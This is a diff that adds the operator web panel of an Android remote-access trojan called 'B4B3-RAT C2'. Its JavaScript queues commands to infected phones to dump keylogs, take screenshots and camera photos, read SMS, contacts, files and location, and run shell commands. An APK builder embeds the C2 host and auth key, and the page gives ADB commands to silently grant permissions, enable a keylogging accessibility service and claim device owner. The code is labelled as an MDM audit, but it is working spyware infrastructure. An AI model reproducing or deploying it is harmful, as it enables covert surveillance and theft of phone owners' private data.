@@ -1,0 +1,773 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Android — B4B3-RAT C2</title>
+<script src="js/config.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0D1B2A;--bg2:#1A2E42;--bg3:#243C57;--accent:#00C2A8;--warn:#F4A261;--text:#E8EEF4;--muted:#6B7FA3;--light:#BDD3E8;--r:10px;--green:#2dbe6c;--red:#e84242}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column}
+a{color:var(--accent);text-decoration:none}
+header{background:var(--bg2);border-bottom:1px solid var(--bg3);padding:0 20px;display:flex;align-items:center;gap:12px;height:52px;flex-shrink:0}
+.logo{font-family:monospace;font-size:12px;color:var(--accent);letter-spacing:2px}
+.spacer{flex:1}
+.layout{display:flex;flex:1;overflow:hidden;min-height:0}
+/* sidebar */
+.sidebar{width:260px;background:var(--bg2);border-right:1px solid var(--bg3);display:flex;flex-direction:column;flex-shrink:0;overflow:hidden}
+.sb-head{padding:12px 14px 8px;display:flex;align-items:center;justify-content:space-between}
+.sb-head h2{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase}
+.sb-count{background:var(--bg3);color:var(--light);font-size:10px;padding:2px 7px;border-radius:20px}
+#agent-list{flex:1;overflow-y:auto;padding:4px 8px 12px}
+.agent-item{padding:9px 11px;border-radius:8px;cursor:pointer;margin-bottom:2px;border:1px solid transparent}
+.agent-item:hover{background:var(--bg3)}
+.agent-item.active{background:var(--bg3);border-color:var(--accent)}
+.agent-id{font-family:monospace;font-size:10px;color:var(--accent)}
+.agent-model{font-size:12px;color:var(--light);margin-top:2px}
+.agent-seen{font-size:10px;color:var(--muted);margin-top:1px}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:4px;flex-shrink:0}
+.dot-green{background:var(--green)}.dot-red{background:var(--red)}
+/* main */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0}
+.tab-bar{display:flex;background:var(--bg3);border-bottom:1px solid var(--bg3);flex-shrink:0;overflow-x:auto}
+.tab{background:var(--bg2);border:none;color:var(--muted);font-size:12px;padding:9px 16px;cursor:pointer;font-family:inherit;white-space:nowrap;border-right:1px solid var(--bg3)}
+.tab:hover{color:var(--light)}.tab.active{color:var(--accent);font-weight:700;background:var(--bg)}
+.panel{display:none;flex:1;padding:18px 22px;flex-direction:column;gap:14px;overflow-y:auto;min-height:0}
+.panel.active{display:flex}
+/* cards */
+.card{background:var(--bg2);border:1px solid var(--bg3);border-radius:12px;padding:16px;display:flex;flex-direction:column;gap:10px;flex-shrink:0}
+.card-title{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase}
+.info-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
+.info-item label{font-size:10px;color:var(--muted);display:block;margin-bottom:2px}
+.info-item p{font-size:12px;color:var(--light);font-family:monospace}
+/* terminal */
+.term-wrap{background:#060e18;border:1px solid var(--bg3);border-radius:8px;display:flex;flex-direction:column;height:380px;flex-shrink:0}
+.term-output{flex:1;overflow-y:auto;padding:12px;font-family:'Cascadia Code','Consolas',monospace;font-size:12px;line-height:1.6;word-break:break-all}
+.term-line{margin-bottom:1px}
+.term-cmd{color:#00C2A8}.term-result{color:#c8d8e8}.term-info{color:#6B7FA3;font-style:italic}.term-error{color:#e84242}
+.term-input-row{display:flex;align-items:center;border-top:1px solid var(--bg3);padding:8px 12px;gap:8px;flex-shrink:0}
+.term-prompt{color:var(--accent);font-family:monospace;font-size:13px;font-weight:700;flex-shrink:0}
+.term-input{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-family:'Cascadia Code','Consolas',monospace;font-size:12px}
+/* suggestions */
+.suggestions{display:flex;flex-wrap:wrap;gap:6px;margin-top:2px}
+.sug{background:var(--bg3);border:1px solid var(--bg3);color:var(--light);border-radius:6px;padding:5px 10px;cursor:pointer;font-size:11px;font-family:monospace;transition:.12s}
+.sug:hover{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.sug.cat-collect{border-color:#00446a}.sug.cat-cam{border-color:#2a4422}.sug.cat-sys{border-color:#3a2a10}
+/* builder */
+.build-form{display:flex;flex-direction:column;gap:10px}
+.form-row{display:flex;flex-direction:column;gap:4px}
+.form-row label{font-size:11px;color:var(--muted)}
+.form-row input{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;color:var(--text);font-family:monospace;font-size:13px;padding:9px 12px;outline:none}
+.form-row input:focus{border-color:var(--accent)}
+.form-row small{font-size:10px;color:var(--muted)}
+.steps{display:flex;flex-direction:column;gap:6px;counter-reset:step}
+.step{display:flex;gap:10px;align-items:flex-start;font-size:12px;color:var(--light);counter-increment:step}
+.step::before{content:counter(step);background:var(--bg3);color:var(--accent);font-weight:700;font-family:monospace;border-radius:50%;width:22px;height:22px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:11px}
+code{background:var(--bg);border:1px solid var(--bg3);border-radius:4px;padding:1px 6px;font-family:monospace;font-size:11px;color:#7be0d4}
+/* buttons */
+.btn{cursor:pointer;border:none;border-radius:7px;font-family:inherit;font-size:12px;padding:7px 14px}
+.btn-primary{background:var(--accent);color:var(--bg);font-weight:700}.btn-primary:hover{background:#00a896}
+.btn-sec{background:var(--bg3);color:var(--light)}.btn-sec:hover{background:var(--accent);color:var(--bg)}
+.btn-danger{background:#2a0e0e;color:#f47061;border:1px solid #5a1a1a}.btn-danger:hover{background:#5a1a1a}
+.badge{font-size:10px;padding:2px 7px;border-radius:20px;font-weight:600}
+.bdg-green{background:#0d2e1a;color:#2dbe6c}.bdg-red{background:#2e0d0d;color:#e84242}
+.empty{color:var(--muted);font-size:13px;font-style:italic;padding:8px 0}
+.files-grid{display:flex;flex-wrap:wrap;gap:8px}
+.file-card{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:7px 10px;display:flex;flex-direction:column;gap:6px}
+.file-card a{font-family:monospace;font-size:11px;color:var(--accent)}
+.file-thumb{max-width:300px;max-height:200px;border-radius:5px;border:1px solid var(--bg3)}
+.results-box{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:11px;font-family:monospace;font-size:12px;color:var(--light);line-height:1.7;max-height:280px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.bypass-cmd{background:var(--bg);border:1px solid #1a3a2a;border-left:3px solid #2dbe6c;border-radius:6px;padding:9px 12px;font-family:monospace;font-size:11px;color:#7be0d4;overflow-x:auto;white-space:pre;margin:5px 0 2px;cursor:pointer}
+.bypass-cmd:hover{background:#0d1f14}
+.res-entry{padding-bottom:7px;margin-bottom:7px;border-bottom:1px solid var(--bg3)}
+.res-entry:last-child{border-bottom:none}
+.res-time{color:var(--muted);font-size:10px;margin-bottom:2px}
+.auto-row{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted)}
+.auto-row input{accent-color:var(--accent)}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo"><a href="index.html">◀ B4B3-RAT</a> / 📱 Android</div>
+  <div class="spacer"></div>
+  <div class="auto-row">
+    <a class="btn btn-sec" href="map.html" style="padding:5px 10px;font-size:11px">🌍 Live Map</a>
+    <span id="last-refresh" style="font-size:11px">—</span>
+    <button class="btn btn-sec" onclick="loadAgents()" style="padding:5px 10px">↻</button>
+    <label class="auto-row"><input type="checkbox" id="auto-chk" checked> Auto-refresh</label>
+  </div>
+</header>
+
+<div class="layout">
+  <!-- ── sidebar ── -->
+  <div class="sidebar">
+    <div class="sb-head">
+      <h2>📱 Android Agents</h2>
+      <span class="sb-count" id="agent-count">0</span>
+    </div>
+    <div id="agent-list"><div class="empty" style="padding:14px 12px">No agents yet</div></div>
+  </div>
+
+  <!-- ── main ── -->
+  <div class="main" id="main-area">
+    <div style="padding:40px;color:var(--muted);font-style:italic;font-size:13px">
+      Select an agent — or use the <strong style="color:var(--accent)">Builder</strong> tab to generate a config.json and build the APK.
+      <br><br>
+      <button class="btn btn-primary" onclick="openBuilder()">⚙️ Open APK Builder</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const BASE = (typeof C2_BASE!=='undefined') ? C2_BASE : '';
+let currentAgent = null, refreshTimer = null;
+
+// ── COMMAND DEFINITIONS ───────────────────────────────────────────────────────
+const COMMANDS = [
+  {cmd:'info',        icon:'📋', label:'Device Info',    desc:'Model, OS, operator, IDs',              cat:'sys'},
+  {cmd:'keylogs',     icon:'⌨️', label:'Dump Keylogs',   desc:'All captured keystrokes',               cat:'collect'},
+  {cmd:'shot',        icon:'🖥️', label:'Screenshot',     desc:'Full screen JPEG',                      cat:'cam'},
+  {cmd:'cam',         icon:'🤳', label:'Front Camera',   desc:'Selfie photo',                          cat:'cam'},
+  {cmd:'cam_back',    icon:'📷', label:'Back Camera',    desc:'Rear camera photo',                     cat:'cam'},
+  {cmd:'files',       icon:'📁', label:'List Files',     desc:'Images, docs, downloads',               cat:'collect'},
+  {cmd:'sms',         icon:'💬', label:'Read SMS',       desc:'Inbox messages',                        cat:'collect'},
+  {cmd:'contacts',    icon:'👤', label:'Contacts',       desc:'Full address book',                     cat:'collect'},
+  {cmd:'location',    icon:'📍', label:'Location',       desc:'Last GPS coordinates',                  cat:'collect'},
+  {cmd:'bypass_test', icon:'🔐', label:'Bypass Test',    desc:'Test all permission bypass vectors vs MDM', cat:'sys'},
+];
+
+// ── AGENTS ────────────────────────────────────────────────────────────────────
+async function loadAgents() {
+  try {
+    const r = await fetch(BASE+'/api/android/agents',{credentials:'include'});
+    if (r.status===401){location.href='login.html';return;}
+    const agents = await r.json();
+    renderSidebar(agents);
+    document.getElementById('last-refresh').textContent = new Date().toLocaleTimeString();
+    if (currentAgent) {
+      const upd = agents.find(a=>a.id===currentAgent.id);
+      if (upd) currentAgent = upd;
+    }
+  } catch(e){console.error(e);}
+}
+
+function renderSidebar(agents) {
+  document.getElementById('agent-count').textContent = agents.length;
+  const list = document.getElementById('agent-list');
+  if (!agents.length){list.innerHTML='<div class="empty" style="padding:12px">No Android agents</div>';return;}
+  list.innerHTML = agents.map(a=>{
+    const online = isOnline(a.lastSeen);
+    return `<div class="agent-item ${currentAgent?.id===a.id?'active':''}" onclick='selectAgent(${JSON.stringify(JSON.stringify(a))})'>
+      <div class="agent-id"><span class="dot ${online?'dot-green':'dot-red'}"></span>${a.id.slice(0,22)}</div>
+      <div class="agent-model">${esc(a.mfr)} ${esc(a.model)}</div>
+      <div class="agent-seen">Android ${esc(a.release)} · SDK ${esc(a.sdk)}</div>
+      <div class="agent-seen">${timeAgo(a.lastSeen)} ${a.hasPending?'· <span style="color:var(--warn)">cmd pending</span>':''}</div>
+    </div>`;
+  }).join('');
+}
+
+function selectAgent(jsonStr){
+  currentAgent = JSON.parse(jsonStr);
+  renderMain(currentAgent);
+  loadAgents(); // re-render sidebar active state
+}
+
+// ── MAIN PANEL ────────────────────────────────────────────────────────────────
+function renderMain(a){
+  document.getElementById('main-area').innerHTML = `
+    <div class="tab-bar">
+      <button class="tab active" onclick="showTab('terminal',this)">⌨ Terminal</button>
+      <button class="tab" onclick="showTab('overview',this)">📋 Overview</button>
+      <button class="tab" onclick="showTab('results',this)">📄 Results</button>
+      <button class="tab" onclick="showTab('files',this)">🖼 Files / Media</button>
+      <button class="tab" onclick="showTab('builder',this)">⚙️ APK Builder</button>
+      <button class="tab" onclick="showTab('delivery',this)">📨 Delivery</button>
+    </div>
+    <div id="tab-terminal" class="panel active">${renderTerminal()}</div>
+    <div id="tab-overview" class="panel">${renderOverview(a)}</div>
+    <div id="tab-results"  class="panel">${renderResultsPanel()}</div>
+    <div id="tab-files"    class="panel">${renderFilesPanel()}</div>
+    <div id="tab-builder"  class="panel">${renderBuilder()}</div>
+    <div id="tab-delivery" class="panel">${renderDeliveryPanel()}</div>
+  `;
+  // wire up terminal input
+  const inp = document.getElementById('term-inp');
+  if(inp){
+    inp.addEventListener('keydown', e=>{
+      if(e.key==='Enter'){e.preventDefault();termSubmit();}
+      else if(e.key==='ArrowUp'){e.preventDefault();historyUp();}
+      else if(e.key==='ArrowDown'){e.preventDefault();historyDown();}
+    });
+    inp.focus();
+  }
+}
+
+function showTab(id,btn){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+  if(id==='results')  loadResults();
+  if(id==='files')    loadFiles();
+  if(id==='delivery') loadDeliveryLog();
+}
+
+function openBuilder(){
+  document.getElementById('main-area').innerHTML = `
+    <div class="tab-bar">
+      <button class="tab active" onclick="showTab('builder',this)">⚙️ APK Builder</button>
+      <button class="tab" onclick="showTab('delivery',this)">📨 Delivery</button>
+    </div>
+    <div id="tab-builder"  class="panel active">${renderBuilder()}</div>
+    <div id="tab-delivery" class="panel">${renderDeliveryPanel()}</div>`;
+}
+
+// ── TERMINAL ─────────────────────────────────────────────────────────────────
+let termHistory = [], termHistIdx = -1, termLines = [];
+
+function renderTerminal(){
+  const sugHtml = COMMANDS.map(c=>
+    `<span class="sug cat-${c.cat}" onclick="termInsert('${c.cmd}')" title="${c.desc}">${c.icon} ${c.label}</span>`
+  ).join('');
+  return `
+    <div class="card" style="flex:1;min-height:0;gap:8px">
+      <div style="display:flex;align-items:center;justify-content:space-between">
+        <div class="card-title">Terminal — ${esc(currentAgent?.id||'')}</div>
+        <div style="display:flex;gap:6px">
+          <button class="btn btn-sec" style="font-size:11px;padding:4px 9px" onclick="termClear()">Clear</button>
+          <button class="btn btn-sec" style="font-size:11px;padding:4px 9px" onclick="loadResults()">↻ Sync Results</button>
+        </div>
+      </div>
+      <div style="font-size:10px;color:var(--muted)">Commands are queued and executed on next beacon (~30s). Results auto-load.</div>
+      <div class="term-wrap" style="flex:1">
+        <div class="term-output" id="term-out">
+          <div class="term-line term-info">Connected to ${esc(currentAgent?.mfr||'')} ${esc(currentAgent?.model||'')} · Android ${esc(currentAgent?.release||'')}</div>
+          <div class="term-line term-info">Type a command or click a suggestion below. Results appear after the agent beacons.</div>
+        </div>
+        <div class="term-input-row">
+          <span class="term-prompt">android &gt;</span>
+          <input id="term-inp" class="term-input" placeholder="command..." autocomplete="off" spellcheck="false">
+          <button class="btn btn-primary" onclick="termSubmit()" style="padding:5px 12px">Send</button>
+        </div>
+      </div>
+      <div>
+        <div style="font-size:10px;color:var(--muted);margin-bottom:6px">SUGGESTIONS — click to send:</div>
+        <div class="suggestions">${sugHtml}
+          <span class="sug cat-sys" onclick="termInsert('shell id')" title="Run shell command">🐚 shell id</span>
+          <span class="sug cat-sys" onclick="termInsert('shell getprop ro.product.model')" title="Device props">🐚 shell getprop</span>
+          <span class="sug cat-sys" onclick="termInsert('shell pm list packages -3')" title="Installed apps">🐚 shell pm list</span>
+          <span class="sug cat-sys" onclick="termInsert('shell dumpsys battery')" title="Battery info">🐚 shell battery</span>
+        </div>
+      </div>
+    </div>`;
+}
+
+function termInsert(cmd){
+  const inp = document.getElementById('term-inp');
+  if(inp){inp.value=cmd;inp.focus();}
+}
+
+async function termSubmit(){
+  const inp = document.getElementById('term-inp');
+  if(!inp||!currentAgent) return;
+  const cmd = inp.value.trim();
+  if(!cmd) return;
+  inp.value = '';
+  termHistIdx = -1;
+  termHistory.unshift(cmd);
+  if(termHistory.length>50) termHistory.pop();
+
+  termPrint('cmd', '> ' + cmd);
+
+  try {
+    const r = await fetch(BASE+`/api/bot/${currentAgent.id}/cmd`,{
+      method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({cmd})
+    });
+    const j = await r.json();
+    if(j.ok){
+      termPrint('info','✓ Queued. Waiting for agent beacon (~30s)...');
+      // Poll for new result
+      pollForResult(cmd);
+    } else {
+      termPrint('error','✗ ' + JSON.stringify(j));
+    }
+  } catch(e){ termPrint('error','Error: '+e.message); }
+}
+
+async function pollForResult(sentCmd){
+  // Poll up to 90s for a new result
+  const startCount = await getResultCount();
+  let waited = 0;
+  const iv = setInterval(async()=>{
+    waited += 5;
+    const count = await getResultCount();
+    if(count > startCount){
+      clearInterval(iv);
+      const results = await getResults();
+      if(results.length){
+        const latest = results[0];
+        termPrint('result', latest.data);
+      }
+    }
+    if(waited >= 90) clearInterval(iv);
+  }, 5000);
+}
+
+async function getResultCount(){
+  try {
+    const r = await fetch(BASE+`/api/bot/${currentAgent.id}`,{credentials:'include'});
+    const b = await r.json();
+    return (b.results||[]).length;
+  } catch{ return 0; }
+}
+
+async function getResults(){
+  try {
+    const r = await fetch(BASE+`/api/bot/${currentAgent.id}`,{credentials:'include'});
+    const b = await r.json();
+    return (b.results||[]);
+  } catch{ return []; }
+}
+
+function termPrint(type, text){
+  const out = document.getElementById('term-out');
+  if(!out) return;
+  const div = document.createElement('div');
+  div.className = 'term-line term-'+type;
+  div.textContent = text;
+  out.appendChild(div);
+  out.scrollTop = out.scrollHeight;
+  termLines.push({type,text});
+}
+
+function termClear(){
+  const out = document.getElementById('term-out');
+  if(out){out.innerHTML='';termLines=[];}
+}
+
+function historyUp(){
+  if(termHistory.length===0) return;
+  termHistIdx = Math.min(termHistIdx+1, termHistory.length-1);
+  const inp = document.getElementById('term-inp');
+  if(inp) inp.value = termHistory[termHistIdx];
+}
+function historyDown(){
+  termHistIdx = Math.max(termHistIdx-1, -1);
+  const inp = document.getElementById('term-inp');
+  if(inp) inp.value = termHistIdx>=0 ? termHistory[termHistIdx] : '';
+}
+
+// ── OVERVIEW ─────────────────────────────────────────────────────────────────
+function renderOverview(a){
+  const online = isOnline(a.lastSeen);
+  return `
+    <div class="card">
+      <div class="card-title">Device Info</div>
+      <div class="info-grid">
+        <div class="info-item"><label>Status</label><p><span class="badge ${online?'bdg-green':'bdg-red'}">${online?'ONLINE':'OFFLINE'}</span></p></div>
+        <div class="info-item"><label>Model</label><p>${esc(a.mfr)} ${esc(a.model)}</p></div>
+        <div class="info-item"><label>Android</label><p>${esc(a.release)} (SDK ${esc(a.sdk)})</p></div>
+        <div class="info-item"><label>Operator</label><p>${esc(a.operator)||'—'}</p></div>
+        <div class="info-item"><label>Agent ID</label><p style="font-size:10px">${esc(a.id)}</p></div>
+        <div class="info-item"><label>First Seen</label><p>${fmt(a.firstSeen)}</p></div>
+        <div class="info-item"><label>Last Seen</label><p>${fmt(a.lastSeen)}</p></div>
+        <div class="info-item"><label>Files</label><p>${a.fileCount}</p></div>
+        <div class="info-item"><label>Results</label><p>${a.resultCount}</p></div>
+      </div>
+    </div>
+    <div class="card">
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <button class="btn btn-primary" onclick="quickSend('info')">📋 Device Info</button>
+        <button class="btn btn-sec" onclick="quickSend('keylogs')">⌨️ Dump Keylogs</button>
+        <button class="btn btn-sec" onclick="quickSend('shot')">🖥️ Screenshot</button>
+        <button class="btn btn-sec" onclick="quickSend('cam')">🤳 Front Camera</button>
+        <button class="btn btn-sec" onclick="quickSend('files')">📁 Files</button>
+        <button class="btn ${a.blocked?'btn-primary':'btn-danger'}" onclick="toggleBlock('${a.id}')">
+          ${a.blocked?'🔓 Unblock':'🔒 Block Agent'}
+        </button>
+      </div>
+    </div>`;
+}
+
+async function quickSend(cmd){
+  if(!currentAgent) return;
+  await fetch(BASE+`/api/bot/${currentAgent.id}/cmd`,{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});
+  alert('✓ Command "'+cmd+'" queued. Switch to Terminal tab to see the result.');
+}
+
+// ── RESULTS ───────────────────────────────────────────────────────────────────
+function renderResultsPanel(){
+  return `<div class="card" style="flex:1">
+    <div style="display:flex;align-items:center;gap:8px">
+      <div class="card-title">Command Results</div>
+      <button class="btn btn-sec" style="font-size:11px;padding:4px 9px" onclick="loadResults()">↻ Refresh</button>
+    </div>
+    <div id="results-content" class="results-box" style="max-height:none;flex:1"><span style="color:var(--muted)">Loading...</span></div>
+  </div>`;
+}
+
+async function loadResults(){
+  if(!currentAgent) return;
+  const box = document.getElementById('results-content');
+  if(!box) return;
+  try {
+    const r = await fetch(BASE+`/api/bot/${currentAgent.id}`,{credentials:'include'});
+    const bot = await r.json();
+    if(!bot.results||!bot.results.length){box.innerHTML='<span style="color:var(--muted)">No results yet</span>';return;}
+    box.innerHTML = bot.results.slice().reverse().map(r=>
+      `<div class="res-entry"><div class="res-time">${fmt(r.time)}</div><div>${esc(r.data)}</div></div>`
+    ).join('');
+  } catch(e){box.textContent='Error: '+e.message;}
+}
+
+// ── FILES / MEDIA ─────────────────────────────────────────────────────────────
+function renderFilesPanel(){
+  return `<div class="card" style="flex:1">
+    <div style="display:flex;align-items:center;gap:8px">
+      <div class="card-title">Uploaded Files &amp; Media</div>
+      <button class="btn btn-sec" style="font-size:11px;padding:4px 9px" onclick="loadFiles()">↻ Refresh</button>
+    </div>
+    <div id="files-content"><span style="color:var(--muted)">Loading...</span></div>
+  </div>`;
+}
+
+async function loadFiles(){
+  if(!currentAgent) return;
+  const box = document.getElementById('files-content');
+  if(!box) return;
+  try {
+    const r = await fetch(BASE+`/api/bot/${currentAgent.id}`,{credentials:'include'});
+    const bot = await r.json();
+    if(!bot.files||!bot.files.length){box.innerHTML='<div class="empty">No files uploaded yet</div>';return;}
+    box.innerHTML = '<div class="files-grid">' + bot.files.slice().reverse().map(f=>{
+      const isImg = /\.(jpg|jpeg|png|gif|webp)$/i.test(f);
+      const isLog = /keylog/i.test(f);
+      const url   = BASE+'/uploads/'+encodeURIComponent(f);
+      const thumb = isImg ? `<img class="file-thumb" src="${url}" onerror="this.style.display='none'" loading="lazy">` : '';
+      const icon  = isImg?'🖼️': isLog?'⌨️':'📎';
+      return `<div class="file-card">
+        <a href="${url}" target="_blank">${icon} ${esc(f)}</a>${thumb}
+      </div>`;
+    }).join('') + '</div>';
+  } catch(e){box.textContent='Error: '+e.message;}
+}
+
+// ── APK BUILDER ───────────────────────────────────────────────────────────────
+function renderBuilder(){
+  const PKG = 'com.company.rat';
+  return `
+    <div class="card">
+      <div class="card-title">⚙️ APK Config</div>
+      <p style="font-size:12px;color:var(--muted)">
+        Fill in C2 details — used both for <strong>Download config.json</strong> and
+        <strong>Build APK on Server</strong>.
+      </p>
+      <div class="build-form">
+        <div class="form-row">
+          <label>C2 Host</label>
+          <input id="b-host" placeholder="https://192.168.1.100:4444" value="https://192.168.1.100:4444">
+          <small>Your server LAN IP/domain. Phone must be able to reach it.</small>
+        </div>
+        <div class="form-row">
+          <label>Auth Key</label>
+          <input id="b-auth" placeholder="changeme" value="changeme">
+          <small>Must match C2_AUTH in server config.</small>
+        </div>
+        <div class="form-row">
+          <label>Beacon interval (ms)</label>
+          <input id="b-beacon" type="number" value="30000">
+          <small>30000 = 30 s check-in interval.</small>
+        </div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:4px">
+          <button class="btn btn-sec" onclick="downloadConfig()">⬇ Download config.json</button>
+          <button class="btn btn-primary" id="build-btn" onclick="buildApk()">🔨 Build APK on Server</button>
+          <button class="btn btn-sec" id="dl-apk-btn" style="display:none" onclick="downloadApk()">📦 Download Built APK</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" id="build-log-card" style="display:none">
+      <div style="display:flex;align-items:center;justify-content:space-between">
+        <div class="card-title">Build Output</div>
+        <span id="build-status" style="font-size:11px;color:var(--muted)">running...</span>
+      </div>
+      <div id="build-log" style="background:#060e18;border:1px solid var(--bg3);border-radius:7px;padding:12px;font-family:monospace;font-size:11px;color:#c8d8e8;line-height:1.6;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Install Steps (after APK is built)</div>
+      <div class="steps">
+        <div class="step">Click <strong>Build APK on Server</strong> above — Gradle runs on the server and the APK is ready to download when done.</div>
+        <div class="step">Click <strong>Download Built APK</strong> to save <code>audit-agent.apk</code>.</div>
+        <div class="step">Install on test device:<br>
+          <code>adb install -r audit-agent.apk</code><br>
+          <span style="color:var(--muted);font-size:11px">or sideload: copy APK to phone → Files app → tap → allow unknown sources</span></div>
+        <div class="step">Launch app. Grant permissions when prompted. Then <strong>Settings → Accessibility → Audit Helper → Enable</strong> for keylogging.</div>
+        <div class="step">Agent appears in the sidebar within ~30 s.</div>
+        <div class="step">Run <strong>bypass_test</strong> from the terminal tab to check which MDM controls are working.</div>
+      </div>
+    </div>
+
+    <div class="card" style="border-color:#1a3a2a">
+      <div class="card-title" style="color:#2dbe6c">🔐 MDM Bypass Test — ADB Commands</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:10px">
+        Run these manually to test each bypass vector. Each one targets a different control the MDM should block.
+        A command that <strong style="color:#f47061">SUCCEEDS</strong> = security gap. One that <strong style="color:#2dbe6c">FAILS/ERRORS</strong> = control is working.
+        Results are also reported automatically when you send <code>bypass_test</code> from the terminal.
+      </p>
+
+      <div class="card-title" style="margin-top:8px">1 — Install with auto-permission grant</div>
+      <pre class="bypass-cmd">adb install -g -r audit-agent.apk</pre>
+      <p style="font-size:11px;color:var(--muted)">MDM should block: flags that automatically grant runtime permissions on install.</p>
+
+      <div class="card-title" style="margin-top:12px">2 — Shell pm grant (runtime permission bypass)</div>
+      <pre class="bypass-cmd">adb shell pm grant ${PKG} android.permission.CAMERA
+adb shell pm grant ${PKG} android.permission.READ_SMS
+adb shell pm grant ${PKG} android.permission.ACCESS_FINE_LOCATION
+adb shell pm grant ${PKG} android.permission.READ_CONTACTS
+adb shell pm grant ${PKG} android.permission.READ_EXTERNAL_STORAGE
+adb shell pm grant ${PKG} android.permission.RECORD_AUDIO</pre>
+      <p style="font-size:11px;color:var(--muted)">MDM should block: ADB-granted permissions that bypass the user prompt. Should return "Operation not allowed" when MDM is active.</p>
+
+      <div class="card-title" style="margin-top:12px">3 — Activate Device Admin (elevated privileges)</div>
+      <pre class="bypass-cmd">adb shell dpm set-active-admin ${PKG}/.DeviceAdminReceiver</pre>
+      <p style="font-size:11px;color:var(--muted)">MDM should block: apps registering as Device Admin silently. If blocked, DeviceAdminReceiver.onEnabled() never fires.</p>
+
+      <div class="card-title" style="margin-top:12px">4 — Set Device Owner (highest privilege)</div>
+      <pre class="bypass-cmd">adb shell dpm set-device-owner ${PKG}/.DeviceAdminReceiver</pre>
+      <p style="font-size:11px;color:var(--muted)">MDM should block: requires no accounts on device or factory-reset state. Device Owner can silently grant ALL permissions.</p>
+
+      <div class="card-title" style="margin-top:12px">5 — Silent accessibility service enable</div>
+      <pre class="bypass-cmd">adb shell settings put secure enabled_accessibility_services ${PKG}/.KeylogService
+adb shell settings put secure accessibility_enabled 1</pre>
+      <p style="font-size:11px;color:var(--muted)">MDM should block: enabling accessibility services without user interaction. Required for keylogging. MDM can restrict WRITE_SECURE_SETTINGS.</p>
+
+      <div class="card-title" style="margin-top:12px">6 — Verify what actually got through</div>
+      <pre class="bypass-cmd">adb shell dumpsys package ${PKG} | findstr "granted=true"
+adb shell settings get secure enabled_accessibility_services
+adb shell dpm list-owners</pre>
+      <p style="font-size:11px;color:var(--muted)">Check the actual state after all attempts above. Compare with bypass_test output from the agent.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Patch APK config without full rebuild</div>
+      <p style="font-size:12px;color:var(--muted)">If the C2 IP changes, download a new config.json and patch it in:</p>
+      <pre style="background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:12px;font-size:11px;color:#9ab0e0;overflow-x:auto">apktool d audit-agent.apk -o apk_out
+copy config.json apk_out\\assets\\config.json
+apktool b apk_out -o app-patched.apk
+zipalign -v 4 app-patched.apk app-final.apk
+apksigner sign --ks debug.keystore --out app-signed.apk app-final.apk
+adb install -r app-signed.apk</pre>
+    </div>`;
+}
+
+async function downloadConfig(){
+  const host   = document.getElementById('b-host')?.value?.trim();
+  const auth   = document.getElementById('b-auth')?.value?.trim();
+  const beacon = document.getElementById('b-beacon')?.value || '30000';
+  if(!host){alert('Enter C2 host URL');return;}
+  try {
+    const r = await fetch(BASE+'/api/android/builder/config',{
+      method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({host, auth, trust_all:true, beacon_ms: parseInt(beacon)})
+    });
+    if(!r.ok){alert('Error: '+await r.text());return;}
+    const blob = await r.blob();
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'config.json';
+    a.click();
+  } catch(e){alert('Error: '+e.message);}
+}
+
+async function buildApk(){
+  const host   = document.getElementById('b-host')?.value?.trim();
+  const auth   = document.getElementById('b-auth')?.value?.trim();
+  const beacon = document.getElementById('b-beacon')?.value || '30000';
+  if(!host){alert('Enter C2 host URL');return;}
+
+  const logCard = document.getElementById('build-log-card');
+  const logEl   = document.getElementById('build-log');
+  const statusEl= document.getElementById('build-status');
+  const buildBtn= document.getElementById('build-btn');
+  const dlBtn   = document.getElementById('dl-apk-btn');
+
+  if(logCard) logCard.style.display='flex';
+  if(logEl)   logEl.textContent = '';
+  if(statusEl)statusEl.textContent = 'building...';
+  if(statusEl)statusEl.style.color = 'var(--warn)';
+  if(buildBtn)buildBtn.disabled = true;
+  if(dlBtn)   dlBtn.style.display='none';
+
+  function appendLog(line){
+    if(!logEl) return;
+    logEl.textContent += line + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  try {
+    const r = await fetch(BASE+'/api/android/builder/build',{
+      method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({host, auth, trust_all:true, beacon_ms: parseInt(beacon)})
+    });
+
+    const reader = r.body.getReader();
+    const dec    = new TextDecoder();
